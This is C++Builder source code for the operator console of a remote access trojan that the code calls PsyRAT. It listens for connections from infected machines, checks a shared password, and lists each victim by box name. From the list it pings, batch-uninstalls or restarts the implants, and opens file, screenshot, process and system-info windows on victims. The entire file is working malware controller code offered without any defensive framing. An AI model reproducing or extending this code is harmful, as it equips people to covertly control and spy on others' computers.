//---------------------------------------------------------------------------

#include <vcl.h>
#include <winsock.h>
#pragma hdrstop

#include "Unit1.h"
#include "Unit2.h"
#include "Unit3.h"
#include "Unit4.h"
#include "Unit9.h"
#include "Unit10.h"
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma resource "*.dfm"
TForm1 *Form1;
char szIn[128000],szBuffer[4096];
SOCKET client,cl2;
DWORD ret;
char tmp[128];

DWORD WINAPI ClientThread(LPVOID lpParam) {
   char *boxname;
   int j;
   client=(SOCKET)lpParam;
   SuspendThread(hTimeThread);
   ZeroMemory(&szIn,128000);
   recv(client,(char *)szIn,sizeof(szIn),0);
   //ShowMessage(szIn);
   //ShowMessage("a");
   if (strcmp(szIn,"PASS")==0) {
      ZeroMemory(&szIn,128000);
      ZeroMemory(&szBuffer,4096);
      strcpy(szBuffer,Form2->txtPassword->Text.c_str());
      send(client,(const char *)szBuffer,strlen(szBuffer),0);
      //ShowMessage("a");
      recv(client,(char *)szIn,sizeof(szIn),0);
      //ShowMessage("b");
      if (strcmp(szIn,"GOODPWD") == 0) { //ARE WE GOOD OR NOT
         //txtStatus->Lines->Add("Successfully Authenticated.");
         ZeroMemory(&szIn,128000);
         recv(client,(char *)szIn,sizeof(szIn),0);
         //ShowMessage(szIn);
         //Check for what version of PsyRAT
         //ShowMessage(szIn);
         if (strstr(szIn,"PsyRAT_20A")) {
            boxname=strstr(szIn,"|")+1;
            Form1->status->Panels->Items[0]->Text = "Connected to a PsyRAT 2.0b1 server.";
            Form1->lstConns->Items->Add();
            j = Form1->lstConns->Items->Count - 1;
            Form1->lstConns->Items->Item[j]->ImageIndex = 9;
            Form1->lstConns->Items->Item[j]->SubItems->Add(boxname);
            Form1->lstConns->Items->Item[j]->SubItems->Add(client);
         }

     //} else if (strstr(szIn,"BADPWD")) { //Uh oh
     } else {
          //txtStatus->Lines->Add("Invalid password, not authenticated.");
          closesocket(client);
          //Form1->Stop1Click(NULL);
          //MessageBox(0,"A server has reported an invalid password.","Invalid Password",MB_ICONERROR);
          //WSACleanup();
          //btnConnect->Visible = TRUE;
          //btnDisconnect->Visible = FALSE;
          //PageControl1->Enabled = FALSE;
          //PageControl1->ActivePage = TabSheet1;
          //txtStatus->Lines->Add("Disconnected.");
     }
  }
  ResumeThread(hTimeThread);
}

DWORD WINAPI TimeoutWatchThread(LPVOID lpParam) {
   SOCKET sock;
   DWORD ret;
   char szBuf[1024],szIn[1024];
   int i,j;
   //ShowMessage("a");
   while (listening) {
      //ShowMessage("b");
      if(timecheck) {
         //ShowMessage("c");
         i = Form1->lstConns->Items->Count - 1;
         if (i>=0) {
            j=0;
            while ((j<=i) && (timecheck)) {
               ZeroMemory(szIn,1024);
               ZeroMemory(szBuf,1024);
               i = Form1->lstConns->Items->Count - 1;
               if (j<=i) {
                  sock = (SOCKET)StrToInt(Form1->lstConns->Items->Item[j]->SubItems->Strings[1].c_str());
                  strcpy(szBuf,"PING");
                  send(sock,(const char *)szBuf,strlen(szBuf),0);
                  ret = recv(sock,(char *)szIn,sizeof(szIn),0);
                  if (strcmp(szIn,"PONG")) {
                     closesocket(sock);
                     Form1->lstConns->Items->Item[j]->Delete();
                     i = Form1->lstConns->Items->Count - 1;
                  }
               }
               j++;
            }
         }
      }
      Sleep(5000);
   }
}

DWORD WINAPI ConnectionThread(LPVOID lpParam) {
	WSADATA wsa;
	SOCKET sock, csock;
	SOCKADDR_IN sin;
	char szBuffer[2048],szSrv[256],fileloc[256],szLocName[64], windir[256], phptemp[128],temp[1],boxname[128];
	DWORD len = 4096;
	DWORD lenInfBuf = 1024;
	DWORD lenBoxname = 128;
	DWORD dwThreadId;
	int lenOut,port;
	HANDLE hThread;
	HKEY Key;
   SOCKADDR_IN out;
	ZeroMemory(&fileloc,256);
	ZeroMemory(&windir,256);
	ZeroMemory(&phptemp,128);
	ZeroMemory(&szLocName,64);
	port=atoi(Form2->txtPort->Text.c_str());
   WSAStartup(MAKEWORD(2,2), &wsa);
	sock = socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
	sin.sin_family = AF_INET;
	sin.sin_port = htons(port);
	sin.sin_addr.s_addr = htonl(INADDR_ANY);
   bind(sock, (SOCKADDR *)&sin, sizeof(sin));
	listen(sock, 8);
	while (listening) {
		lenOut = sizeof(out);
		csock = accept(sock,(struct sockaddr *)&out,&lenOut);
		if (csock == INVALID_SOCKET) {
			//printf("\nAccept failed.");
			break;
		}
		//printf("\nConnected with: %s:%d",
            //inet_ntoa(out.sin_addr), ntohs(out.sin_port));
		hThread = CreateThread(NULL, 0, ClientThread,
                    (LPVOID)csock, 0, &dwThreadId);
        if (hThread == NULL)
        {
            //printf("\nCreateThread() failed: %d", GetLastError());
            break;
        }
        CloseHandle(hThread);
	}
	closesocket(sock);
	WSACleanup();
}



//---------------------------------------------------------------------------
__fastcall TForm1::TForm1(TComponent* Owner)
   : TForm(Owner)
{
}
//---------------------------------------------------------------------------
void __fastcall TForm1::Settings1Click(TObject *Sender)
{
   Form2->Visible = TRUE;
}
//---------------------------------------------------------------------------
void __fastcall TForm1::Listen1Click(TObject *Sender)
{
   DWORD dwThreadId;
   status->Panels->Items[0]->Text = "Creating threads...";
   listening=TRUE;
   timecheck=TRUE;
   hThread = CreateThread(NULL, 0, ConnectionThread,
      0, 0, &dwThreadId);
   hTimeThread = CreateThread(NULL, 0, TimeoutWatchThread,
      0, 0, &dwThreadId);
   status->Panels->Items[0]->Text = "Listening";
   MainMenu1->Items->Items[0]->Items[0]->Enabled = FALSE;
   MainMenu1->Items->Items[0]->Items[1]->Enabled = TRUE;
}
//---------------------------------------------------------------------------
void __fastcall TForm1::Stop1Click(TObject *Sender)
{
   int i,j;
   SOCKET tmpsock;
   TerminateThread(hTimeThread,0);
   TerminateThread(hThread,0);
   CloseHandle(hTimeThread);
   CloseHandle(hThread);
   listening=FALSE;
   timecheck=FALSE;
   status->Panels->Items[0]->Text = "Stopped";
   i = Form1->lstConns->Items->Count - 1;
   if (i>=0) {
      for (j=0;j<=i;j++) {
         tmpsock = (SOCKET)StrToInt(lstConns->Items->Item[j]->SubItems->Strings[1].c_str());
         closesocket(tmpsock);
      }
      lstConns->Clear();
      WSACleanup();
   }
   MainMenu1->Items->Items[0]->Items[0]->Enabled = TRUE;
   MainMenu1->Items->Items[0]->Items[1]->Enabled = FALSE;
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Info1Click(TObject *Sender)
{
   int i;
   if (lstConns->Items->Count) {
      i = lstConns->Selected->Index;
      //ShowMessage(lstConns->Items->Item[i]->SubItems->Strings[0].c_str());
      Form3->infoclient = (SOCKET)StrToInt(lstConns->Items->Item[i]->SubItems->Strings[1].c_str());
      strcpy(Form3->inf_boxname,lstConns->Items->Item[i]->SubItems->Strings[0].c_str());
      Form3->Visible = TRUE;
      strcpy(tmp,"Activated client: ");
      strcat(tmp,Form3->inf_boxname);
      Form3->StatusBar1->Panels->Items[0]->Text = tmp;
   }
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Files1Click(TObject *Sender)
{
   int i;
   if (lstConns->Items->Count) {
      i = lstConns->Selected->Index;
      //ShowMessage(lstConns->Items->Item[i]->SubItems->Strings[0].c_str());
      Form4->fileclient = (SOCKET)StrToInt(lstConns->Items->Item[i]->SubItems->Strings[1].c_str());
      strcpy(Form4->fil_boxname,lstConns->Items->Item[i]->SubItems->Strings[0].c_str());
      Form4->Visible = TRUE;
      strcpy(tmp,"Activated client: ");
      strcat(tmp,Form4->fil_boxname);
      Form4->StatusBar1->Panels->Items[0]->Text = tmp;
   }
}
//---------------------------------------------------------------------------


void __fastcall TForm1::Uninstall1Click(TObject *Sender)
{
   int i,j,sc,fl;
   SOCKET cl2;
   SuspendThread(hTimeThread);
   sc=0;
   fl=0;
   if (MessageBox(0,"Are you sure you want to perform a batch uninstall?","Check",MB_YESNO) == IDYES) {
      if (lstConns->Items->Count) {
      i = lstConns->Items->Count - 1;
         for (j=0;j<=i;j++) {
            ZeroMemory(&szBuffer,2048);
            ZeroMemory(&szIn,128000);
            cl2 = (SOCKET)StrToInt(lstConns->Items->Item[j]->SubItems->Strings[1].c_str());
            strcpy(szBuffer,"uninstall");
            send(cl2,(const char *)szBuffer,strlen(szBuffer),0);
            recv(cl2,(char *)szIn,sizeof(szIn),0);
            if (strcmp(szIn,"BYE") == 0) {
               sc++;
               status->Panels->Items[0]->Text = IntToStr(sc)+" successful uninstall(s), "+IntToStr(fl)+" failed uninstalls.";
            }
            else {
               fl++;
               status->Panels->Items[0]->Text = IntToStr(sc)+" successful uninstall(s), "+IntToStr(fl)+" failed uninstalls.";
            }
            closesocket(cl2);
         }
      }
   }
   status->Panels->Items[0]->Text = IntToStr(sc)+" successful uninstall(s), "+IntToStr(fl)+" failed uninstalls.";
   ResumeThread(hTimeThread);
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Restart1Click(TObject *Sender)
{
   int i,j,sc,fl;
   SOCKET cl2;
   SuspendThread(hTimeThread);
   sc=0;
   fl=0;
   if (MessageBox(0,"Are you sure you want to perform a batch restart?","Check",MB_YESNO) == IDYES) {
      if (lstConns->Items->Count) {
      i = lstConns->Items->Count - 1;
         for (j=0;j<=i;j++) {
            ZeroMemory(&szBuffer,2048);
            ZeroMemory(&szIn,128000);
            cl2 = (SOCKET)StrToInt(lstConns->Items->Item[j]->SubItems->Strings[1].c_str());
            strcpy(szBuffer,"rstsrv");
            send(cl2,(const char *)szBuffer,strlen(szBuffer),0);
            recv(cl2,(char *)szIn,sizeof(szIn),0);
            if (strcmp(szIn,"BYE") == 0) {
               sc++;
               status->Panels->Items[0]->Text = IntToStr(sc)+" successful restart(s), "+IntToStr(fl)+" failed restart(s).";
            }
            else {
               fl++;
               status->Panels->Items[0]->Text = IntToStr(sc)+" successful restart(s), "+IntToStr(fl)+" failed restart(s).";
            }
            closesocket(cl2);
         }
      }
   }
   //status->Panels->Items[0]->Text = IntToStr(sc)+" successful restart(s), "+IntToStr(fl)+" failed restart(s).";
   ResumeThread(hTimeThread);
}
//---------------------------------------------------------------------------


void __fastcall TForm1::Screenshot1Click(TObject *Sender)
{
   int i;
   if (lstConns->Items->Count) {
      i = lstConns->Selected->Index;
      //ShowMessage(lstConns->Items->Item[i]->SubItems->Strings[0].c_str());
      Form9->scrclient = (SOCKET)StrToInt(lstConns->Items->Item[i]->SubItems->Strings[1].c_str());
      strcpy(Form9->scr_boxname,lstConns->Items->Item[i]->SubItems->Strings[0].c_str());
      Form9->Visible = TRUE;
      strcpy(tmp,"Activated client: ");
      strcat(tmp,Form9->scr_boxname);
      Form9->StatusBar1->Panels->Items[0]->Text = tmp;
   }
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Processes1Click(TObject *Sender)
{
   int i;
   if (lstConns->Items->Count) {
      i = lstConns->Selected->Index;
      //ShowMessage(lstConns->Items->Item[i]->SubItems->Strings[0].c_str());
      Form10->prcclient = (SOCKET)StrToInt(lstConns->Items->Item[i]->SubItems->Strings[1].c_str());
      strcpy(Form10->prc_boxname,lstConns->Items->Item[i]->SubItems->Strings[0].c_str());
      Form10->Visible = TRUE;
      strcpy(tmp,"Activated client: ");
      strcat(tmp,Form10->prc_boxname);
      Form10->StatusBar1->Panels->Items[0]->Text = tmp;
   }
}
//---------------------------------------------------------------------------

